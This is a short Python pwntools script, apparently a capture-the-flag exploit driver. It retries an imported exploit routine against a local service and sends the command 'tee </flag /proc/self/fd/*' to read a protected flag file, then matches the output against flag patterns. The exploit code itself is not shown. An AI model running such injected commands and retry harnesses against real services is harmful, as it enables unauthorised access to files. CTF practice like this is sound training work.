import sys, time, re
from pwn import *
import game as G

HOST = "127.0.0.1"
PORT = 36867
CMD = "tee </flag /proc/self/fd/*"

def log(*a):
    print(*a); sys.stdout.flush()

def main():
    from pwnexp import exploit_once
    best = None
    for attempt in range(10):
        log("=== exploit attempt %d ===" % attempt)
        try:
            out = exploit_once(HOST, PORT, CMD, retries=90)
        except Exception as e:
            log("attempt error:", repr(e)[:200]); out = ""
        if out and out.strip():
            log("GOT OUTPUT:", out[:2000])
            if re.search(r"(flag\{|ctf\{|[A-Za-z0-9_]{8,}\{)", out, re.I):
                return 0
        log("no output; tail:", (out or "")[-200:])
        time.sleep(3)
    return 1

sys.exit(main())
